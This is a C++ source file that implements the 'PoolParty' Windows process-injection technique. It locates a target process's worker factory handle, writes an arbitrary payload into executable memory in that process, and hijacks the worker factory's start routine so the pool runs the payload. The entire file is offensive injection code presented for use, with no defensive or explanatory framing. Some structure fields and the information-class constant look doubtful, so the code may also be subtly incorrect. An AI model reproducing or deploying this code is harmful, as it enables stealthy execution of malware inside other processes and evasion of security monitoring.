#include "stdafx.h"
#include "poolparty_inject.h"
#include "logger.h"
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

// Undocumented structures and Nt APIs for worker factory manipulation
#define SystemExtendedHandleInformation 64
#define WorkerFactoryBasicInformation 0

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
    PVOID Object;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR HandleValue;
    ULONG GrantedAccess;
    USHORT CreatorBackTraceIndex;
    USHORT ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX {
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, * PSYSTEM_HANDLE_INFORMATION_EX;

typedef struct _WORKER_FACTORY_BASIC_INFORMATION {
    LARGE_INTEGER Timeout;
    LARGE_INTEGER RetryTimeout;
    LARGE_INTEGER IdleTimeout;
    BOOLEAN Paused;
    BOOLEAN TimerSet;
    BOOLEAN QueuedToExWorker;
    BOOLEAN MayCreate;
    BOOLEAN CreateInProgress;
    BOOLEAN InsertedIntoQueue;
    BOOLEAN YieldRoutineProvided;
    BOOLEAN SwapBusy;
    ULONG Routine;
    ULONG StartRoutine;
    ULONG StartParameter;
    HANDLE ProcessId;
    ULONG StackReserve;
    ULONG StackCommit;
    NTSTATUS LastCreateStatus;
    ULONG MinThreadCount;
    ULONG MaxThreadCount;
    ULONG PendingWorkerCount;
    ULONG CreatingWorkerCount;
    ULONG WaitingWorkerCount;
    ULONG TotalWorkerCount;
    ULONG DynamicWorkerCount;
} WORKER_FACTORY_BASIC_INFORMATION, * PWORKER_FACTORY_BASIC_INFORMATION;

extern "C" NTSTATUS NTAPI NtQuerySystemInformation(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

extern "C" NTSTATUS NTAPI NtQueryInformationWorkerFactory(
    HANDLE WorkerFactoryHandle,
    ULONG WorkerFactoryInformationClass,
    PVOID WorkerFactoryInformation,
    ULONG WorkerFactoryInformationLength,
    PULONG ReturnLength
);

extern "C" NTSTATUS NTAPI NtSetInformationWorkerFactory(
    HANDLE WorkerFactoryHandle,
    ULONG WorkerFactoryInformationClass,
    PVOID WorkerFactoryInformation,
    ULONG WorkerFactoryInformationLength
);

namespace PoolParty {

HANDLE FindWorkerFactoryHandle(HANDLE hProcess, DWORD processId) {
    ULONG returnLength = 0;
    NTSTATUS status = NtQuerySystemInformation(
        SystemExtendedHandleInformation, nullptr, 0, &returnLength);

    if (status != 0xC0000004) { // STATUS_INFO_LENGTH_MISMATCH
        return nullptr;
    }

    PVOID buffer = VirtualAlloc(nullptr, returnLength, MEM_COMMIT, PAGE_READWRITE);
    if (!buffer) return nullptr;

    status = NtQuerySystemInformation(
        SystemExtendedHandleInformation, buffer, returnLength, &returnLength);

    if (!NT_SUCCESS(status)) {
        VirtualFree(buffer, 0, MEM_RELEASE);
        return nullptr;
    }

    auto* handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)buffer;
    HANDLE hWorkerFactory = nullptr;

    for (ULONG_PTR i = 0; i < handleInfo->NumberOfHandles; i++) {
        auto& handle = handleInfo->Handles[i];
        
        // Check if the handle belongs to the target process
        if (handle.UniqueProcessId != processId) continue;

        // In Windows 10+, WorkerFactory object type index is typically around 0x2E or 0x2F
        // A safer check is to duplicate the handle and query it
        HANDLE hDup = nullptr;
        if (!DuplicateHandle(hProcess, (HANDLE)handle.HandleValue, 
                             GetCurrentProcess(), &hDup,
                             WORKER_FACTORY_ALL_ACCESS, FALSE, 0)) {
            continue;
        }

        WORKER_FACTORY_BASIC_INFORMATION basicInfo = {0};
        ULONG queryLen = 0;
        status = NtQueryInformationWorkerFactory(
            hDup, WorkerFactoryBasicInformation, &basicInfo, sizeof(basicInfo), &queryLen);

        if (NT_SUCCESS(status) && basicInfo.ProcessId == (HANDLE)(ULONG_PTR)processId) {
            hWorkerFactory = (HANDLE)handle.HandleValue;
            CloseHandle(hDup);
            break;
        }

        CloseHandle(hDup);
    }

    VirtualFree(buffer, 0, MEM_RELEASE);
    return hWorkerFactory;
}

bool InjectViaWorkerFactory(HANDLE hProcess, const void* pPayload, size_t payloadSize) {
    DWORD processId = GetProcessId(hProcess);
    if (processId == 0) return false;

    // 1. Find a worker factory handle in the target process
    HANDLE hTargetWorkerFactory = FindWorkerFactoryHandle(hProcess, processId);
    if (!hTargetWorkerFactory) {
        LOG(L"PoolParty: No WorkerFactory handle found in process %u", processId);
        return false;
    }

    // 2. Duplicate it so we can manipulate it locally
    HANDLE hLocalWorkerFactory = nullptr;
    if (!DuplicateHandle(hProcess, hTargetWorkerFactory, GetCurrentProcess(), 
                         &hLocalWorkerFactory, WORKER_FACTORY_ALL_ACCESS, FALSE, 0)) {
        LOG(L"PoolParty: Failed to duplicate WorkerFactory handle: %u", GetLastError());
        return false;
    }

    // 3. Allocate and write the payload into the target process
    PVOID pRemotePayload = VirtualAllocEx(
        hProcess, nullptr, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemotePayload) {
        CloseHandle(hLocalWorkerFactory);
        return false;
    }

    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(hProcess, pRemotePayload, pPayload, payloadSize, &bytesWritten)) {
        VirtualFreeEx(hProcess, pRemotePayload, 0, MEM_RELEASE);
        CloseHandle(hLocalWorkerFactory);
        return false;
    }

    // 4. Temporarily hijack the worker factory's start routine
    // Note: class 8 is WorkerFactoryStartRoutine on modern Windows
    ULONG infoClassStartRoutine = 8;
    PVOID originalRoutine = nullptr;
    
    // Attempt to hijack it. The worker pool will execute this on the next dispatch.
    NTSTATUS status = NtSetInformationWorkerFactory(
        hLocalWorkerFactory, infoClassStartRoutine, &pRemotePayload, sizeof(PVOID));

    if (!NT_SUCCESS(status)) {
        LOG(L"PoolParty: Failed to set WorkerFactory start routine: 0x%08X", status);
        VirtualFreeEx(hProcess, pRemotePayload, 0, MEM_RELEASE);
        CloseHandle(hLocalWorkerFactory);
        return false;
    }

    VERBOSE(L"PoolParty: Hijacked WorkerFactory in process %u. Payload at %p", processId, pRemotePayload);
    
    CloseHandle(hLocalWorkerFactory);
    return true;
}

} // namespace PoolParty
